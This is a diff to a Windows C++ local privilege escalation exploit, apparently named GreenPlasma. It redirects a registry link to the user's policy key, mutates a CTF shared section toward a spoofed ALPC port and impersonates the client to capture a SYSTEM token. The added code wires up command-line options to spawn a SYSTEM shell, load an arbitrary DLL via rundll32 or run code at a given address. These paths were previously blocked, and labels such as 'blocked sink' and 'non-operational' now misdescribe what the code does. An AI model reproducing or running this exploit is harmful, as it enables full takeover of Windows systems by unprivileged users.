@@ -208,7 +208,8 @@ enum class GpStatus {
     MapFailed,
     RegistryFailed,
     TimingMiss,
-    MutationFailed
+    MutationFailed,
+    Skipped
 };
 
 struct GpRegistryEvidence {
@@ -261,6 +262,15 @@ struct GpBlockedSinkResult {
     GpStatus preconditionStatus;
 };
 
+struct GpSinkRequest {
+    bool requestSystemShell;
+    bool requestDllLoad;
+    bool requestCodeExecution;
+    const wchar_t* alpcPortName;
+    const wchar_t* dllPath;
+    const void* entryPoint;
+};
+
 // Runtime API pointers and non-operational sink request markers.
 static PFN_NtAlpcCreatePort _NtAlpcCreatePort = NULL;
 static PFN_NtAlpcSendWaitReceivePort _NtAlpcSendWaitReceivePort = NULL;
@@ -274,17 +284,19 @@ static PFN_NtMapViewOfSection _NtMapViewOfSection = NULL;
 static PFN_NtUnmapViewOfSection _NtUnmapViewOfSection = NULL;
 static PFN_CfAbortOperation CfAbortOperation = NULL;
 
+static const wchar_t GP_DEFAULT_TARGET_NAME[] = L"\\BaseNamedObjects\\CTFMON_DEAD";
+static const wchar_t GP_SESSION_SECTION_FORMAT[] = L"\\Sessions\\%lu\\BaseNamedObjects\\CTF.AsmListCache.FMPWinlogon%lu";
 static const wchar_t GP_ALPC_PORT_NAME[] = L"\\RPC Control\\GreenPlasmaSpoofedPort";
 static const wchar_t GP_BLOCKED_DLL_REQUEST[] = L"<blocked-dll-load-request>";
 
-// Hypothesis layout for path-like state mutation. This is not a verified CTF schema.
+// Hypothesis layout for path-like state mutation. This is not a verified schema.
 #pragma pack(push, 1)
-typedef struct _CTF_CACHE_LAYOUT_HYPOTHESIS {
+typedef struct _GP_CACHE_LAYOUT_HYPOTHESIS {
     ULONG Version;
     ULONG Flags;
     ULONG OffsetToData;
     wchar_t AlpcServerPort[MAX_PATH];
-} CTF_CACHE_LAYOUT_HYPOTHESIS, *PCTF_CACHE_LAYOUT_HYPOTHESIS;
+} GP_CACHE_LAYOUT_HYPOTHESIS, *PGP_CACHE_LAYOUT_HYPOTHESIS;
 #pragma pack(pop)
 
 // Output helpers. Default output is concise; verbose trace keeps timestamps and snapshots.
@@ -369,6 +381,8 @@ static const wchar_t* GpStatusName(GpStatus status)
         return L"timing-miss";
     case GpStatus::MutationFailed:
         return L"mutation-failed";
+    case GpStatus::Skipped:
+        return L"skipped";
     default:
         return L"unknown";
     }
@@ -733,6 +747,7 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
     wchar_t* stringSid = NULL;
     wchar_t linktarget[MAX_PATH] = { 0 };
     PTOKEN_USER pTokenUser = NULL;
+    bool linkKeyOpen = false;
 
     if (registry) {
         ZeroMemory(registry, sizeof(*registry));
@@ -799,11 +814,13 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
         TraceWin32(L"P4", L"reg", res);
         goto cleanup;
     }
+    linkKeyOpen = true;
 
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
         failure = GetLastError();
         TraceWin32(L"P4", L"tok", GetLastError());
         DeleteRegistryLinkKey(hk);
+        linkKeyOpen = false;
         goto cleanup;
     }
 
@@ -812,6 +829,7 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
         failure = GetLastError();
         TraceWin32(L"P4", L"tok", GetLastError());
         DeleteRegistryLinkKey(hk);
+        linkKeyOpen = false;
         goto cleanup;
     }
 
@@ -819,6 +837,7 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
     if (!pTokenUser) {
         failure = ERROR_OUTOFMEMORY;
         DeleteRegistryLinkKey(hk);
+        linkKeyOpen = false;
         goto cleanup;
     }
 
@@ -826,6 +845,7 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
         failure = GetLastError();
         TraceWin32(L"P4", L"tok", GetLastError());
         DeleteRegistryLinkKey(hk);
+        linkKeyOpen = false;
         goto cleanup;
     }
     CloseHandle(htoken);
@@ -835,13 +855,19 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
         failure = GetLastError();
         TraceWin32(L"P4", L"sid", GetLastError());
         DeleteRegistryLinkKey(hk);
+        linkKeyOpen = false;
         goto cleanup;
     }
 
-    swprintf_s(
-        linktarget,
-        L"\\REGISTRY\\USER\\%ls\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
-        stringSid);
+    if (swprintf_s(
+            linktarget,
+            L"\\REGISTRY\\USER\\%ls\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+            stringSid) < 0) {
+        failure = ERROR_INSUFFICIENT_BUFFER;
+        DeleteRegistryLinkKey(hk);
+        linkKeyOpen = false;
+        goto cleanup;
+    }
 
     res = RegSetValueExW(
         hk,
@@ -854,6 +880,7 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
         failure = res;
         TraceWin32(L"P4", L"reg", res);
         DeleteRegistryLinkKey(hk);
+        linkKeyOpen = false;
         goto cleanup;
     }
     if (registry) {
@@ -887,6 +914,7 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
         DeleteRegistryLinkKey(hk);
         RegCloseKey(hk);
         hk = NULL;
+        linkKeyOpen = false;
     }
 
     res = RegOpenKeyExW(
@@ -900,6 +928,7 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
         TraceWin32(L"P4", L"reg", res);
         goto cleanup;
     }
+    linkKeyOpen = false;
 
     res = RegSetValueExW(hk, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&val, sizeof(DWORD));
     if (res) {
@@ -925,6 +954,9 @@ exit:
         CloseHandle(htoken);
     }
     if (hk) {
+        if (!ret && linkKeyOpen) {
+            DeleteRegistryLinkKey(hk);
+        }
         RegCloseKey(hk);
     }
     if (registry) {
@@ -1068,12 +1100,12 @@ static bool ApplyAlpcPathMutation(GpRunEvidence* run, const wchar_t* portName)
         return false;
     }
 
-    if (!run->view.base || !run->view.writable || run->view.size < sizeof(CTF_CACHE_LAYOUT_HYPOTHESIS)) {
+    if (!run->view.base || !run->view.writable || run->view.size < sizeof(GP_CACHE_LAYOUT_HYPOTHESIS)) {
         wprintf(L"alpc=skip map\n");
         return false;
     }
 
-    PCTF_CACHE_LAYOUT_HYPOTHESIS layout = (PCTF_CACHE_LAYOUT_HYPOTHESIS)run->view.base;
+    PGP_CACHE_LAYOUT_HYPOTHESIS layout = (PGP_CACHE_LAYOUT_HYPOTHESIS)run->view.base;
     run->alpc.oldVersion = layout->Version;
     run->alpc.oldFlags = layout->Flags;
 
@@ -1187,6 +1219,213 @@ static GpBlockedSinkResult MakeBlockedSinkResult(GpStatus preconditionStatus)
     return result;
 }
 
+static GpBlockedSinkResult MakeSkippedSinkResult(const wchar_t* reason)
+{
+    GpBlockedSinkResult result = { false, reason ? reason : L"not-requested", GpStatus::Skipped };
+    return result;
+}
+
+static GpSinkRequest MakeDefaultSinkRequest()
+{
+    GpSinkRequest request = { 0 };
+    request.requestSystemShell = true;
+    request.requestDllLoad = false;
+    request.requestCodeExecution = false;
+    request.alpcPortName = GP_ALPC_PORT_NAME;
+    request.dllPath = NULL;
+    request.entryPoint = NULL;
+    return request;
+}
+
+static bool ParsePointerValue(const wchar_t* text, const void** value)
+{
+    if (!text || !text[0] || !value) {
+        return false;
+    }
+
+    wchar_t* end = NULL;
+    unsigned __int64 parsed = _wcstoui64(text, &end, 0);
+    if (end == text || !end || *end != L'\0' || parsed == 0) {
+        return false;
+    }
+
+    *value = (const void*)(ULONG_PTR)parsed;
+    return true;
+}
+
+static bool ReadNextArg(
+    int argc,
+    wchar_t** argv,
+    int* index,
+    const wchar_t* errorLabel,
+    const wchar_t** value)
+{
+    if (!argv || !index || !value || *index + 1 >= argc || !argv[*index + 1] || !argv[*index + 1][0]) {
+        wprintf(L"arg=%ls\n", errorLabel ? errorLabel : L"invalid");
+        return false;
+    }
+
+    ++(*index);
+    *value = argv[*index];
+    return true;
+}
+
+static bool ParseCommandLineOptions(
+    int argc,
+    wchar_t** argv,
+    const wchar_t** targetName,
+    GpSinkRequest* request)
+{
+    bool targetSet = false;
+
+    if (!targetName || !request) {
+        return false;
+    }
+
+    *targetName = GP_DEFAULT_TARGET_NAME;
+    *request = MakeDefaultSinkRequest();
+
+    for (int i = 1; i < argc; ++i) {
+        const wchar_t* arg = argv[i];
+        if (!arg || !arg[0]) {
+            continue;
+        }
+
+        if (wcscmp(arg, L"--target") == 0) {
+            const wchar_t* value = NULL;
+            if (!ReadNextArg(argc, argv, &i, L"invalid-target", &value)) {
+                return false;
+            }
+            *targetName = value;
+            targetSet = true;
+        }
+        else if (wcscmp(arg, L"--port") == 0) {
+            const wchar_t* value = NULL;
+            if (!ReadNextArg(argc, argv, &i, L"invalid-port", &value)) {
+                return false;
+            }
+            request->alpcPortName = value;
+        }
+        else if (wcscmp(arg, L"--dll") == 0) {
+            const wchar_t* value = NULL;
+            if (!ReadNextArg(argc, argv, &i, L"invalid-dll", &value)) {
+                return false;
+            }
+            request->dllPath = value;
+            request->requestDllLoad = true;
+        }
+        else if (wcscmp(arg, L"--entry") == 0) {
+            const wchar_t* value = NULL;
+            const void* entryPoint = NULL;
+            if (!ReadNextArg(argc, argv, &i, L"invalid-entry", &value)) {
+                return false;
+            }
+            if (!ParsePointerValue(value, &entryPoint)) {
+                wprintf(L"arg=invalid-entry\n");
+                return false;
+            }
+            request->entryPoint = entryPoint;
+            request->requestCodeExecution = true;
+        }
+        else if (wcscmp(arg, L"--shell") == 0) {
+            request->requestSystemShell = true;
+        }
+        else if (wcscmp(arg, L"--no-shell") == 0) {
+            request->requestSystemShell = false;
+        }
+        else if (!targetSet && arg[0] != L'-') {
+            *targetName = arg;
+            targetSet = true;
+        }
+        else {
+            wprintf(L"arg=unknown value=%ls\n", arg);
+            return false;
+        }
+    }
+
+    return true;
+}
+
+static void PrintSinkResult(const wchar_t* name, const GpBlockedSinkResult& result)
+{
+    wprintf(
+        L"sink=%ls implemented=%u pre=%ls reason=%ls\n",
+        name,
+        result.implemented ? 1 : 0,
+        GpStatusName(result.preconditionStatus),
+        result.reason ? result.reason : L"<none>");
+}
+
+static bool CheckTokenSinkPreconditions(const GpRunEvidence& evidence, GpBlockedSinkResult* result)
+{
+    if (!result) {
+        return false;
+    }
+
+    GpStatus preStatus = PrimitivePrecondition(evidence);
+    if (preStatus != GpStatus::Ok) {
+        result->preconditionStatus = preStatus;
+        result->reason = L"precondition-failed";
+        return false;
+    }
+
+    if (!evidence.capturedSystemToken) {
+        result->preconditionStatus = GpStatus::AccessDenied;
+        result->reason = L"no-system-token-available";
+        return false;
+    }
+
+    return true;
+}
+
+static GpBlockedSinkResult SelectPrimarySinkResult(
+    const GpBlockedSinkResult& alpc,
+    const GpBlockedSinkResult& shell,
+    const GpBlockedSinkResult& dll,
+    const GpBlockedSinkResult& code)
+{
+    if (code.preconditionStatus == GpStatus::Ok) {
+        return code;
+    }
+    if (dll.preconditionStatus == GpStatus::Ok) {
+        return dll;
+    }
+    if (shell.preconditionStatus == GpStatus::Ok) {
+        return shell;
+    }
+    if (alpc.preconditionStatus != GpStatus::Ok) {
+        return alpc;
+    }
+    if (code.preconditionStatus != GpStatus::Skipped) {
+        return code;
+    }
+    if (dll.preconditionStatus != GpStatus::Skipped) {
+        return dll;
+    }
+    if (shell.preconditionStatus != GpStatus::Skipped) {
+        return shell;
+    }
+    return alpc;
+}
+
+static void BlockRequestedTokenSinks(
+    const GpSinkRequest& request,
+    GpStatus preconditionStatus,
+    GpBlockedSinkResult* shell,
+    GpBlockedSinkResult* dll,
+    GpBlockedSinkResult* code)
+{
+    if (request.requestSystemShell && shell) {
+        *shell = MakeBlockedSinkResult(preconditionStatus);
+    }
+    if (request.requestDllLoad && dll) {
+        *dll = MakeBlockedSinkResult(preconditionStatus);
+    }
+    if (request.requestCodeExecution && code) {
+        *code = MakeBlockedSinkResult(preconditionStatus);
+    }
+}
+
 /*
  * Sink boundaries. ALPC captures the primary token; follow-on sinks use that
  * token without taking ownership. Cleanup owns the final token close.
@@ -1196,16 +1435,7 @@ static GpBlockedSinkResult SystemShell(const GpRunEvidence& evidence)
 {
     GpBlockedSinkResult result = { false, L"setup-failed", GpStatus::TriggerFailed };
 
-    GpStatus preStatus = PrimitivePrecondition(evidence);
-    if (preStatus != GpStatus::Ok) {
-        result.preconditionStatus = preStatus;
-        result.reason = L"precondition-failed";
-        return result;
-    }
-
-    if (!evidence.capturedSystemToken) {
-        result.preconditionStatus = GpStatus::AccessDenied;
-        result.reason = L"no-system-token-available";
+    if (!CheckTokenSinkPreconditions(evidence, &result)) {
         return result;
     }
 
@@ -1238,17 +1468,11 @@ static GpBlockedSinkResult DllLoad(const GpRunEvidence& evidence, const wchar_t*
         result.reason = L"invalid-dll-path";
         return result;
     }
-
-    GpStatus preStatus = PrimitivePrecondition(evidence);
-    if (preStatus != GpStatus::Ok) {
-        result.preconditionStatus = preStatus;
-        result.reason = L"precondition-failed";
-        return result;
+    if (wcscmp(requestedDllPath, GP_BLOCKED_DLL_REQUEST) == 0) {
+        return MakeSkippedSinkResult(L"dll-not-requested");
     }
 
-    if (!evidence.capturedSystemToken) {
-        result.preconditionStatus = GpStatus::AccessDenied;
-        result.reason = L"no-system-token-available";
+    if (!CheckTokenSinkPreconditions(evidence, &result)) {
         return result;
     }
 
@@ -1269,17 +1493,17 @@ static GpBlockedSinkResult DllLoad(const GpRunEvidence& evidence, const wchar_t*
     si.lpDesktop = (LPWSTR)L"Winsta0\\Default";
 
     if (CreateProcessAsUserW(
-        hToken,                       // 1. hToken
-        NULL,                         // 2. lpApplicationName
-        commandLine,                  // 3. lpCommandLine
-        NULL,                         // 4. lpProcessAttributes
-        NULL,                         // 5. lpThreadAttributes
-        FALSE,                        // 6. bInheritHandles
-        CREATE_NEW_CONSOLE,           // 7. dwCreationFlags
-        NULL,                         // 8. lpEnvironment
-        NULL,                         // 9. lpCurrentDirectory
-        &si,                          // 10. lpStartupInfo
-        &pi                           // 11. lpProcessInformation
+        hToken,
+        NULL,
+        commandLine,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_NEW_CONSOLE,
+        NULL,
+        NULL,
+        &si,
+        &pi
     )) {
         result.implemented = true;
         result.reason = L"dll-loaded-via-rundll32";
@@ -1321,6 +1545,7 @@ static GpBlockedSinkResult AlpcTokenCapture(GpRunEvidence& evidence, const wchar
     NTSTATUS status;
     HANDLE hServerPort = NULL;
     HANDLE hConnPort = NULL;
+    bool impersonated = false;
     
     GpBlockedSinkResult result = { false, L"setup-failed", GpStatus::MutationFailed };
 
@@ -1405,6 +1630,7 @@ static GpBlockedSinkResult AlpcTokenCapture(GpRunEvidence& evidence, const wchar
         result.reason = L"impersonation-failed";
         goto cleanup;
     }
+    impersonated = true;
 
     HANDLE hToken = NULL;
     if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, TRUE, &hToken)) {
@@ -1445,7 +1671,13 @@ token_done:
         result.reason = L"open-thread-token-failed";
     }
 
-    RevertToSelf();
+    if (impersonated && !RevertToSelf()) {
+        if (result.preconditionStatus == GpStatus::Ok) {
+            result.preconditionStatus = GpStatus::AccessDenied;
+            result.reason = L"revert-failed";
+            result.implemented = false;
+        }
+    }
 
 cleanup:
     if (hConnPort) CloseHandle(hConnPort);
@@ -1470,16 +1702,7 @@ static GpBlockedSinkResult CodeExecution(const GpRunEvidence& evidence, const vo
         return result;
     }
 
-    GpStatus preStatus = PrimitivePrecondition(evidence);
-    if (preStatus != GpStatus::Ok) {
-        result.preconditionStatus = preStatus;
-        result.reason = L"precondition-failed";
-        return result;
-    }
-
-    if (!evidence.capturedSystemToken) {
-        result.preconditionStatus = GpStatus::AccessDenied;
-        result.reason = L"no-system-token-available";
+    if (!CheckTokenSinkPreconditions(evidence, &result)) {
         return result;
     }
 
@@ -1522,21 +1745,41 @@ static GpBlockedSinkResult CodeExecution(const GpRunEvidence& evidence, const vo
     return result;
 }
 
-static GpBlockedSinkResult TouchBlockedSinkBoundaries(GpRunEvidence& evidence)
+static GpBlockedSinkResult TouchBlockedSinkBoundaries(GpRunEvidence& evidence, const GpSinkRequest& request)
 {
-    GpBlockedSinkResult c = AlpcTokenCapture(evidence, GP_ALPC_PORT_NAME);
-    GpBlockedSinkResult primary = c;
-    if (c.preconditionStatus == GpStatus::Ok) {
-        primary = SystemShell(evidence);
-    }
-    GpBlockedSinkResult b = DllLoad(evidence, GP_BLOCKED_DLL_REQUEST);
-    GpBlockedSinkResult d = CodeExecution(evidence, NULL);
+    const wchar_t* portName = request.alpcPortName && request.alpcPortName[0]
+        ? request.alpcPortName
+        : GP_ALPC_PORT_NAME;
 
-    UNREFERENCED_PARAMETER(b);
-    UNREFERENCED_PARAMETER(d);
+    GpBlockedSinkResult alpc = AlpcTokenCapture(evidence, portName);
+    GpBlockedSinkResult shell = MakeSkippedSinkResult(L"shell-not-requested");
+    GpBlockedSinkResult dll = MakeSkippedSinkResult(L"dll-not-requested");
+    GpBlockedSinkResult code = MakeSkippedSinkResult(L"code-not-requested");
+
+    if (alpc.preconditionStatus == GpStatus::Ok) {
+        if (request.requestSystemShell) {
+            shell = SystemShell(evidence);
+        }
+        if (request.requestDllLoad) {
+            dll = DllLoad(evidence, request.dllPath);
+        }
+        if (request.requestCodeExecution) {
+            code = CodeExecution(evidence, request.entryPoint);
+        }
+    }
+    else {
+        BlockRequestedTokenSinks(request, alpc.preconditionStatus, &shell, &dll, &code);
+    }
+
+    GpBlockedSinkResult primary = SelectPrimarySinkResult(alpc, shell, dll, code);
+    PrintSinkResult(L"alpc", alpc);
+    PrintSinkResult(L"shell", shell);
+    PrintSinkResult(L"dll", dll);
+    PrintSinkResult(L"code", code);
     wprintf(
-        L"sinks=blocked primary=alpc pre=%ls\n",
-        GpStatusName(primary.preconditionStatus));
+        L"sinks=checked primary_pre=%ls primary_reason=%ls\n",
+        GpStatusName(primary.preconditionStatus),
+        primary.reason ? primary.reason : L"<none>");
     return primary;
 }
 
@@ -1549,6 +1792,7 @@ int wmain(int argc, wchar_t** argv)
     UNICODE_STRING linkTarget = { 0 };
     OBJECT_ATTRIBUTES objattr = { 0 };
     GpRunEvidence run = { 0 };
+    GpSinkRequest sinkRequest = MakeDefaultSinkRequest();
     GpBlockedSinkResult primarySink = { false, L"blocked-by-design", GpStatus::RegistryFailed };
     int exitCode = 1;
 
@@ -1565,11 +1809,14 @@ int wmain(int argc, wchar_t** argv)
 
     swprintf_s(
         sourceName,
-        L"\\Sessions\\%lu\\BaseNamedObjects\\CTF.AsmListCache.FMPWinlogon%lu",
+        GP_SESSION_SECTION_FORMAT,
         sessionId,
         sessionId);
 
-    const wchar_t* targetName = argc == 2 ? argv[1] : L"\\BaseNamedObjects\\CTFMON_DEAD";
+    const wchar_t* targetName = NULL;
+    if (!ParseCommandLineOptions(argc, argv, &targetName, &sinkRequest)) {
+        return 1;
+    }
     run.namesBuilt = true;
 
     RtlInitUnicodeString(&linkSource, sourceName);
@@ -1637,8 +1884,8 @@ int wmain(int argc, wchar_t** argv)
 
     if (run.registry.succeeded) {
         run.desktopTiming = WaitForDesktopTransitionWindow();
-        ApplyAlpcPathMutation(&run, GP_ALPC_PORT_NAME);
-        primarySink = TouchBlockedSinkBoundaries(run);
+        ApplyAlpcPathMutation(&run, sinkRequest.alpcPortName);
+        primarySink = TouchBlockedSinkBoundaries(run, sinkRequest);
 
         run.lockAttempted = true;
         if (!LockWorkStation()) {
@@ -1651,7 +1898,7 @@ int wmain(int argc, wchar_t** argv)
         }
     }
     else {
-        primarySink = TouchBlockedSinkBoundaries(run);
+        primarySink = TouchBlockedSinkBoundaries(run, sinkRequest);
     }
     if (primarySink.preconditionStatus == GpStatus::Ok && (!run.lockAttempted || run.lockSucceeded)) {
         exitCode = 0;
